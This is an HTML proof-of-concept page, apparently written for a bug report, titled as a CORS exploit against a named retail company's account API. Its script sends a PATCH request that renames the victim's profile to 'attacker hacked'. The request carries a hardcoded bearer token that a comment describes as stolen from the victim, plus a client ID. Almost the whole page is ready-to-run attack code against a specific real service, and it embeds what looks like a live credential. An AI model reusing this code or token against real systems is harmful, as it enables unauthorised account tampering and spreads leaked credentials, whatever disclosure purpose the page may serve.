<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>CORS Exploit Example</title>
  <script>
    // Malicious script on attacker's website (attacker.com)
    function send_path(){

    fetch("https://api.account.relianceretail.com/service/application/account-centre/v1.0/edit-profile", {
      method: "PATCH",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJycmlkIjoiNWZmZjdiY2YtODg1NC00NDNmLTg2MjctODg1ZThjOTY1MmY0IiwiZGV2aWNlX2luZm8iOiJPeEM2cVU3NUtDVHNxdVpvVnhFeHBzbHF2SjNVQmFiNVI3R2lFZE10NUtlMUxvMXh3cEcyUTJBU05mZkc5bHl0SEZFNFB1Ni9RQTN6SUNPN2dtV3RBN1FwTEtNY01QUytCOCtKTmdZZEdZSWxpbStSK2Y0ZTZUZUhOMExpVDhHOC9UUEVBWFFXVE9iVmZxaWJkWS9rWlJZdytISGZUaFV2RmcrTGpDUG92RTh2cDRDUXZXS3lqaHVQLzN4TjlXa3FZZUdkWjhnT1c1MExwa1AwNnAxeUtuaU5hMm83a1Y0M3RkYUJqWXhrN1d0VkpSekp1MGJuNE5PNnUrcDZnc3N2VFdscFI2VmZ6QnpPMTMydjRYN1lSK2JqTE1HaFVjV1hHL1ZZR3djdVBJYVpNamNpWGRWa1BmdmVtdEErZXFxc0xvN21kMFJrWEMrUEtJZmlhYS9JYXc9PSIsImlhdCI6MTczNTE0ODkwNSwiZXhwIjoxNzM1NzUzNzA1LCJzYWx0IjowfQ.kjHG3jJNTqsWe_4SS-bTQcfoudJlszeOUcc9uRK9Bbs", // Token stolen or hijacked from victim
        "Client_id": "fdb646ea-e708-4725-a953-228fa1cb8355"  // Optional: Client_id added
      },
      body: JSON.stringify({
        first_name: "attacker",
        last_name: "hacked",
      }),
      Origin: "https://account.relianceretail.com",
    })
      .then(response => response.json())
      .then(data => {
        console.log("Data modified:", data);
      })
      .catch(error => console.error("Error:", error));
    }

  </script>
</head>

<body>
  <h1>Malicious Page</h1>
  <p>This page tries to modify user profile without the user's consent.</p>
  <button onclick="send_path()">click me</button>
</body>

</html>
